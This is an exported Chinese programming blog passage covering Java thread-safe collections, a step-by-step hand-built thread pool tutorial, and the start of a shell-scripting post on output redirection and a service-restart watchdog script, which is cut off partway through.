<h3 id="线程安全的集合类"><a href="#线程安全的集合类" class="headerlink" title="线程安全的集合类"></a>线程安全的集合类</h3><p><img src="../../typora-user-images/image-20221124112756210.png" alt="image-20221124112756210"></p>
<p>这里分为三类</p>
<ol>
<li><p>遗留的：HashTable（Map），Vector（List）</p>
</li>
<li><p>使用 Collections 装饰的线程安全集合，如：Collections.synchronizedCollection，可以将线程不安全的集合包装为线程安全的，底层实际上就是方法调用时包装类对原先方法加锁。  </p>
</li>
<li><p>JUC包下的类</p>
</li>
</ol>
]]></content>
      <categories>
        <category>并发</category>
      </categories>
      <tags>
        <tag>并发</tag>
      </tags>
  </entry>
  <entry>
    <title>手写线程池</title>
    <url>//post/%E5%B9%B6%E5%8F%91/%E6%89%8B%E5%86%99%E7%BA%BF%E7%A8%8B%E6%B1%A0.html</url>
    <content><![CDATA[<h1 id="手写线程池"><a href="#手写线程池" class="headerlink" title="手写线程池"></a>手写线程池</h1><blockquote>
<p>​    我们从初级阶段自己创建线程去异步执行任务，到后期使用线程池不断执行任务，原理书上都有，但都是字面意思，无法深入理解，所以打算自己进行实现。</p>
</blockquote>
<ol>
<li>阶段一：</li>
</ol>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"异步执行"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="2">
<li>阶段二:</li>
</ol>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 抽离出一个统一接口，具体实现由子类完成</span>
<span class="token keyword">interface</span> <span class="token class-name">Executor</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token class-name">Runnable</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// 定义各自的子类去实现execute方法</span>
<span class="token annotation punctuation">@Slf4j</span>
<span class="token keyword">class</span> myExecutor <span class="token keyword">implements</span> <span class="token class-name">Executor</span> <span class="token punctuation">&#123;</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token class-name">Runnable</span> r<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 底层还是执行的 new Thread(r)，虽然现在看起来是有点儿麻烦，但更方便我们进行扩展了</span>
        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol start="3">
<li>阶段三：上面我们执行一次方法就创建一个线程，先不说会不会OOM，就线程的创建与销毁都够损耗性能的。我们能不能只使用一个异步线程，但是执行多个任务呢?</li>
</ol>
<blockquote>
<p>这里我之前有一个小疑惑，一般任务都是在<code>new Thead(这里就指定好需要完成的任务).start()</code>，那假如这个线程执行完了后，我还能不能再指定一个新的任务，让它再启动，后来发现不行，执行完的线程就已经挂了，不能再进行复用，那大家平时说的线程复用是啥意思呢？ 所以转化一些思路，是线程一直在运行，在这期间不断读取一个任务表，第一个任务完成后，马上干第二个任务。以此类推，让一个线程完成多个任务。</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 抽离出一个统一接口，具体实现由子类完成</span>
<span class="token keyword">interface</span> <span class="token class-name">Executor</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token class-name">Runnable</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token annotation punctuation">@Slf4j</span>
<span class="token keyword">class</span> myExecutor <span class="token keyword">implements</span> <span class="token class-name">Executor</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 创建一个阻塞任务队列</span>
    <span class="token keyword">static</span> <span class="token class-name">BlockingDeque</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Runnable</span><span class="token punctuation">></span></span> task <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedBlockingDeque</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 使用一个线程不断从任务队列中读取数据，然后执行，达到复用的效果</span>
        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"异步线程开始不断读取任务。。。"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
                <span class="token comment">// 因为无限循环，所以线程会一直运行，后期我们会再升级，让它优雅的结束</span>
                <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token comment">// take方法是阻塞方法，当队列中无任务时，线程阻塞</span>
                    <span class="token class-name">Runnable</span> poll <span class="token operator">=</span> task<span class="token punctuation">.</span><span class="token function">take</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token comment">// 当读取到任务时，就开始执行。</span>
                    poll<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token class-name">Runnable</span> r<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 新来的任务直接添加到队列中</span>
        task<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol start="4">
<li><p>阶段四：上面仍有许多潜在的问题</p>
<ol>
<li>其中一个任务报错且未处理，后面的任务别想执行了。</li>
<li>其中一个任务耗时过久，新来的任务迟迟不能处理，任务会不断挤压，造成OOM。</li>
<li>未利用多核CPU的优势</li>
</ol>
<p>未利用多核CPU的问题很简单，不是嫌少嘛，我多安排几个线程去不断监控任务队列，这里一定注意队列需要有锁保护，不能一个任务多个线程都处理一遍</p>
</li>
</ol>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Slf4j</span>
<span class="token keyword">class</span> myExecutor <span class="token keyword">implements</span> <span class="token class-name">Executor</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 创建一个阻塞任务队列</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">BlockingDeque</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Runnable</span><span class="token punctuation">></span></span> task <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedBlockingDeque</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// 需要指定多少个线程去执行</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token constant">CORE_POOL_SIZE</span><span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token class-name">Runnable</span> r<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 新来的任务直接添加到队列中</span>
        task<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token function">myExecutor</span><span class="token punctuation">(</span><span class="token keyword">int</span> corePoolSize<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token constant">CORE_POOL_SIZE</span> <span class="token operator">=</span> corePoolSize<span class="token punctuation">;</span>
        <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">// 初始化制定线程数去不断监控队列</span>
    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 使用一个线程不断从任务队列中读取数据，然后执行，达到复用的效果</span>
        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"异步线程开始不断读取任务。。。"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token constant">THREAD_SIZE</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
                    <span class="token comment">// 因为无限循环，所以线程会一致运行</span>
                    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                        <span class="token comment">// take方法是阻塞方法，当队列中无任务时，线程阻塞</span>
                      	<span class="token comment">// 通过看源码我们能发现在任务读取时，使用了RetreenLock加锁了</span>
                        <span class="token class-name">Runnable</span> poll <span class="token operator">=</span> task<span class="token punctuation">.</span><span class="token function">take</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token comment">// 当读取到任务时，就开始执行。</span>
                        poll<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol start="5">
<li><p>阶段五：上面有哪些问题呢？</p>
<ol>
<li>我们初始化时直接创建了<code>corePoolSize</code>个数量的线程，如果一直没任务不就浪费了嘛，还占内存，我们能不能指定<code>corePoolSize</code>后，暂时不创建线程，每次执行任务时，判断当前工作线程数，是否小于<code>corePoolSize</code>,如果小于，我就创建新的线程，否则我就不创建线程了。</li>
<li>传入RejectedExecutionHandler对象，任务队列不能无限放置吧，所以当我们判定任务队列已经满了的时候，就需要使用用户传来的RejectedExecutionHandler进行处理，也就是决定这些任务该怎么处理。</li>
<li>传入ThreadFactory对象，对线程进行统一的管理，如线程名，需要执行额外的逻辑，而不直接new Thread()。</li>
<li>线程自我摧毁装置，当一定时间内都没有获取到任务，就默认线程池不需要太多的线程了，则进行销毁</li>
</ol>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Slf4j</span>
<span class="token keyword">class</span> myExecutor <span class="token keyword">implements</span> <span class="token class-name">Executor</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 创建一个阻塞任务队列</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">BlockingDeque</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Runnable</span><span class="token punctuation">></span></span> task <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedBlockingDeque</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// 定制任务队列长度，当队列长度溢出，触发溢出策略</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">int</span> queueSize<span class="token punctuation">;</span>

    <span class="token comment">// 需要指定多个线程去执行</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token constant">CORE_POOL_SIZE</span><span class="token punctuation">;</span>

    <span class="token comment">// 任务溢出策略</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">RejectedExecutionHandler</span> handler<span class="token punctuation">;</span>

    <span class="token comment">// 利用工厂模式统一管理线程的创建，例如线程名等信息</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">ThreadFactory</span> factory<span class="token punctuation">;</span>

    <span class="token comment">// 检查在线线程数量</span>
    <span class="token keyword">private</span> <span class="token class-name">AtomicInteger</span> workThreadSize <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicInteger</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token class-name">Runnable</span> r<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      	<span class="token comment">// 这里应该进行同步，因为判断与添加是两个操作</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>workThreadSize<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token constant">CORE_POOL_SIZE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// 如果线程数不到核心线程数，每进入一个任务，就添加一个线程</span>
            <span class="token function">addThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">taskAdd</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">private</span> <span class="token keyword">synchronized</span> <span class="token keyword">void</span> <span class="token function">addThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        factory<span class="token punctuation">.</span><span class="token function">newThread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>workThreadSize<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token constant">CORE_POOL_SIZE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token class-name">Runnable</span> poll <span class="token operator">=</span> task<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">,</span> <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>poll <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                        <span class="token comment">//但当我们任务量可能已经渐渐平缓了，就不再需要那么多线程监听了,这里我们默认可以只剩5个，当然也可以作为参数调整</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span>workThreadSize<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                            <span class="token keyword">synchronized</span> <span class="token punctuation">(</span><span class="token class-name">Executor</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                                <span class="token keyword">if</span> <span class="token punctuation">(</span>workThreadSize<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                                    <span class="token comment">// 让线程结束</span>
                                    <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">interrupt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                    workThreadSize<span class="token punctuation">.</span><span class="token function">decrementAndGet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                <span class="token punctuation">&#125;</span>
                            <span class="token punctuation">&#125;</span>
                        <span class="token punctuation">&#125;</span>
                    <span class="token punctuation">&#125;</span>
                    <span class="token comment">// 当读取到任务时，就开始执行。</span>
                    poll<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// 通过一个自旋锁，来保证在线线程数准确</span>
            <span class="token keyword">int</span> size <span class="token operator">=</span> workThreadSize<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>workThreadSize<span class="token punctuation">.</span><span class="token function">compareAndSet</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>size<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">private</span> <span class="token keyword">synchronized</span> <span class="token keyword">void</span> <span class="token function">taskAdd</span><span class="token punctuation">(</span><span class="token class-name">Runnable</span> r<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>task<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span>queueSize<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// 这里可以定义不同的任务溢出策略</span>
            handler<span class="token punctuation">.</span><span class="token function">rejectedExecution</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        task<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token function">myExecutor</span><span class="token punctuation">(</span><span class="token keyword">int</span> thread_size<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>queueSize <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token constant">CORE_POOL_SIZE</span> <span class="token operator">=</span> thread_size<span class="token punctuation">;</span>
        <span class="token comment">// 如果线程池队列满了丢掉这个任务并且抛出RejectedExecutionException异常。</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>handler <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ThreadPoolExecutor<span class="token punctuation">.</span>AbortPolicy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>factory <span class="token operator">=</span> <span class="token class-name">Executors</span><span class="token punctuation">.</span><span class="token function">defaultThreadFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token function">myExecutor</span><span class="token punctuation">(</span><span class="token keyword">int</span> queueSize<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token constant">CORE_POOL_SIZE</span><span class="token punctuation">,</span> <span class="token class-name">RejectedExecutionHandler</span> handler<span class="token punctuation">,</span> <span class="token class-name">ThreadFactory</span> factory<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>queueSize <span class="token operator">=</span> queueSize<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token constant">CORE_POOL_SIZE</span> <span class="token operator">=</span> <span class="token constant">CORE_POOL_SIZE</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>handler <span class="token operator">=</span> handler<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>factory <span class="token operator">=</span> factory<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ol>
<p>这里JUC包下定义的参数<img src="../../typora-user-images/image-20221028210505748.png" alt="image-20221028210505748"></p>
<p>这里是我们，自己定义的，唯一不一样就是少了<code>maximumPoolSize</code>,也就是再对线程数量进行控制，这里感兴趣的朋友可以自己试着去做。</p>
<p><img src="../../typora-user-images/image-20221028210704145.png" alt="image-20221028210704145"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​    如果你能跟随着思路完成到这里，我觉得这块儿知识点，你应该是没问题了，具体代码细节，或者是组件如何使用，就靠你们自己去查询和实验。我感觉我的代码还是通俗易懂的。这里再次感谢<code>低并发编程</code>公众号，我感觉干活满满，推荐大家读一读。</p>
]]></content>
      <categories>
        <category>手写系列</category>
      </categories>
      <tags>
        <tag>线程池</tag>
      </tags>
  </entry>
  <entry>
    <title>Shell脚本</title>
    <url>//post/Linux/shell%E8%84%9A%E6%9C%AC.html</url>
    <content><![CDATA[<h1 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h1><h2 id="输入输出重定向"><a href="#输入输出重定向" class="headerlink" title="输入输出重定向"></a>输入输出重定向</h2><blockquote>
<p>我们在后台挂在jar包时，常使用过一个命令：<code>nohup java -jar xxx.jar &gt; java.log 2&gt;&amp;1 &amp;</code></p>
<p>这里就有几个知识点：</p>
<ol>
<li>末尾的 <code>&amp;</code> 代表后台默认启动，页面关闭后，程序终止。</li>
<li>头部的 <code>nohup</code> 表示页面关闭后，后台仍继续运行，如果没有指定日志文件，则默认将输出重定向到<code>nohup.log</code>文件</li>
<li><code>java -jar xxx.jar</code>最基本的启动jar包</li>
<li><code>&gt; java.log</code> 将运行jar包后的输出日志文件重定向到 <code>java.log</code>文件中</li>
<li><code>2&gt;&amp;1</code>将标准输出与标准错误输出合并，在当前语义下就是将所有信息输出到 <code>java.log</code>文件。<ol>
<li>如果只写 <code>&gt;</code> 表示只将正常输出重定向到log文件中，错误信息直接显示页面</li>
<li>如果写 <code>2&gt;</code> 表示只将错误输出重定向到log文件中，正常信息直接显示页面</li>
</ol>
</li>
<li><code>&gt;</code> 默认表示重定向，并覆盖原来内容</li>
<li><code>&gt;&gt;</code> 表示以追加的方式重定向</li>
</ol>
</blockquote>
<p>这样我们就可以监控到后台运行程序的日志信息了。</p>
<h2 id="shell脚本保证程序运行"><a href="#shell脚本保证程序运行" class="headerlink" title="shell脚本保证程序运行"></a>shell脚本保证程序运行</h2><blockquote>
<p><strong>需求</strong>：当我们将项目挂在到服务器中，可能过一会儿服务就挂机了，我们可能还不知道请求，就需要一个脚本定时的去监控，程序是否仍在运行中。</p>
</blockquote>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>
<span class="token function">lsof</span> <span class="token parameter variable">-i:8080</span>
<span class="token assign-left variable">renren</span><span class="token operator">=</span><span class="token variable">$?</span>
<span class="token function">lsof</span> <span class="token parameter variable">-i:82</span>
<span class="token assign-left variable">getaway</span><span class="token operator">=</span><span class="token variable">$?</span>
<span class="token function">lsof</span> <span class="token parameter variable">-i:9001</span>
<span class="token assign-left variable">manager</span><span class="token operator">=</span><span class="token variable">$?</span>
<span class="token function">lsof</span> <span class="token parameter variable">-i:8001</span>
<span class="token assign-left variable">back</span><span class="token operator">=</span><span class="token variable">$?</span>
<span class="token comment">#echo "'renren:', $&#123;renren&#125;"</span>
<span class="token comment">#echo "'getaway:',$&#123;getaway&#125;"</span>
<span class="token comment">#echo "'manager:',$&#123;manager&#125;"</span>
<span class="token comment">#echo "'back:',$&#123;back&#125;"</span>
<span class="token comment"># 判断项目文件都是否都正产运转，如果没有运转，则进行记录日志，并重新启动服务</span>
<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$&#123;back&#125;</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token punctuation">]</span>
<span class="token keyword">then</span>
        <span class="token builtin class-name">cd</span> /project/qiyuan/dist
        <span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token function">date</span> +%F%n%T<span class="token variable">)</span></span>, server restart"</span> <span class="token operator">>></span> renre.log
